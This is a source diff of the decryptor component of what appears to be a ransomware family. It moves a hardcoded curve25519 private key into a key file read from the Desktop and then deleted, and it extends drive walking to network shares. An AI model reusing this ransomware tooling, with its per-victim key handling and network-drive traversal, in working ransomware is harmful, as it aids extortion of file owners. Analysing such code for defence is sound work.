@@ -1,19 +1,13 @@
+#pragma comment(lib, "mpr.lib")
+
 #include "decryptor.h"
 #include <other/memory.h>
-#include "utility.h"
+#include <other/settings.h>
+#include <other/utility.h>
 #include "curve25519.h"
 #include "ecrypt-sync.h"
 #include "sha512.h"
 #include "crc32.h"
-
-/* Size of the ransomware extension in wchar_t. */
-#define SIZE_OF_EXTENSION ((sizeof(RANSOMWARE_EXTENSION) - 1) / sizeof(wchar_t))
-
-/* Private key to decrypt the data with. */
-static const BYTE PRIVATE_KEY[32] = { 0x88, 0xe8, 0xa7, 0x81, 0xe2, 0x6d, 0x7b,
-    0xd3, 0x70, 0x4c, 0x0c, 0x69, 0x07, 0x0c, 0xf0, 0xd5, 0x58, 0xbc, 0xfb,
-    0x30, 0xec, 0xc6, 0x3a, 0xe5, 0x8e, 0xc6, 0xc3, 0xd0, 0xae, 0x1c, 0x2a,
-    0x6d };
 
 /* Directories that should not be encrypted. */
 static const wchar_t* IGNORE_DIRECTORIES[] = { L".", L"..", L"$windows.~bt",
@@ -30,11 +24,13 @@ static HANDLE g_hCompletionPort; /* Handle for the IO completion port. */
 static HCRYPTPROV g_hCryptProv; /* Handle for the crypto service provider. */
 static DWORD g_currentPID; /* Current PID. */
 static BOOL g_finishedIterating = FALSE; /* True if finished iterating all drives. */
+static BYTE g_privateKey[32]; /* Global private key to decrypt the data with. */
 
 static DWORD WINAPI decryptionThread(LPVOID lpParam);
 static DWORD WINAPI driveThread(LPVOID lpParam);
 static void iterateDirectory(const wchar_t* path);
 static inline void decryptFile(HANDLE hFile);
+static inline BOOL parseKeys();
 
 BOOL decryptDrives()
 {
@@ -43,6 +39,12 @@ BOOL decryptDrives()
     if (!CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) &&
         !CryptAcquireContextW(&g_hCryptProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
         return FALSE;
+
+    if (!parseKeys())
+    {
+        CryptReleaseContext(g_hCryptProv, 0);
+        return FALSE;
+    }
 
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo);
@@ -108,6 +110,37 @@ cleanup:
     CloseHandle(g_hCompletionPort);
     CryptReleaseContext(g_hCryptProv, 0);
 
+    return TRUE;
+}
+
+BOOL parseKeys()
+{
+    wchar_t* filePath = getDesktopPath();
+    if (!filePath)
+        return NULL;
+    lstrcatW(filePath, L"\\");
+    lstrcatW(filePath, DEC_PK_FILE_NAME);
+    
+    HANDLE hFile = CreateFileW(filePath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        sfree(filePath);
+        return FALSE;
+    }
+    
+    DWORD dwRead;
+    if (!ReadFile(hFile, g_privateKey, sizeof(g_privateKey), &dwRead, NULL))
+    {
+        CloseHandle(hFile);
+        sfree(filePath);
+
+        return FALSE;
+    }
+
+    CloseHandle(hFile);
+    DeleteFileW(filePath);
+    
+    sfree(filePath);
     return TRUE;
 }
 
@@ -248,16 +281,48 @@ DWORD WINAPI decryptionThread(LPVOID lpParam)
 
 DWORD WINAPI driveThread(LPVOID lpParam)
 {
-    wchar_t path[3];
-    path[0] = (wchar_t)lpParam; path[1] = L':'; path[2] = L'\0';
+    wchar_t path[3] = { 0 };
+    path[0] = (wchar_t)lpParam; path[1] = L':';
 
     DWORD driveType;
     if (driveType = GetDriveTypeW(path))
     {
         if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE || driveType == DRIVE_CDROM)
-            iterateDirectory(path); // Iterate the drive
+        {
+            printf("Decrypting drive %ls\n", path);
+            iterateDirectory(path);
+        }
+        else if (driveType == DRIVE_REMOTE)
+        {
+            wchar_t buffer[MAX_PATH * 4];
+            DWORD dwBufferLength = MAX_PATH * 4;
+            UNIVERSAL_NAME_INFO* unameInfo = (UNIVERSAL_NAME_INFO*)&buffer;
+
+            // Try to get the universal name
+            if (WNetGetUniversalNameW(path, UNIVERSAL_NAME_INFO_LEVEL, unameInfo, &dwBufferLength) == NO_ERROR)
+            {
+                printf("Decrypting network drive %ls -> %ls\n", path, unameInfo->lpUniversalName);
+                iterateDirectory(unameInfo->lpUniversalName);
+            }
+            else
+            {
+                // If failed to get the universal name, attempt to get the remote name
+                dwBufferLength = MAX_PATH * 4;
+                REMOTE_NAME_INFO* remInfo = (REMOTE_NAME_INFO*)&buffer;
+
+                if (WNetGetUniversalNameW(path, REMOTE_NAME_INFO_LEVEL, remInfo, &dwBufferLength) == NO_ERROR)
+                {
+                    printf("Decrypting network drive %ls -> %ls\n", path, remInfo->lpUniversalName);
+                    iterateDirectory(remInfo->lpUniversalName);
+                }
+                else
+                    printf("Failed getting Universal or Remote name for network drive %ls\n", path);
+            }
+        }
     }
-    
+    else
+        printf("Unknown drive %ls (%u)\n", path, driveType);
+
     return 0;
 }
 
@@ -332,8 +397,8 @@ void decryptFile(HANDLE hFile)
         return;
     
     fileSize.QuadPart -= sizeof(FileMetadata_t);
-    curve25519(sharedSecret, PRIVATE_KEY, mt.curve25519Public);
-    SHA512_Simple(sharedSecret, 32, &keys);
+    curve25519(sharedSecret, g_privateKey, mt.curve25519Public);
+    SHA512_Simple(sharedSecret, sizeof(sharedSecret), &keys);
     if (mt.xcrc32Hash != xcrc32(&keys, sizeof(Keys_t)))
     {
         printf("Corrupted keys detected\n");
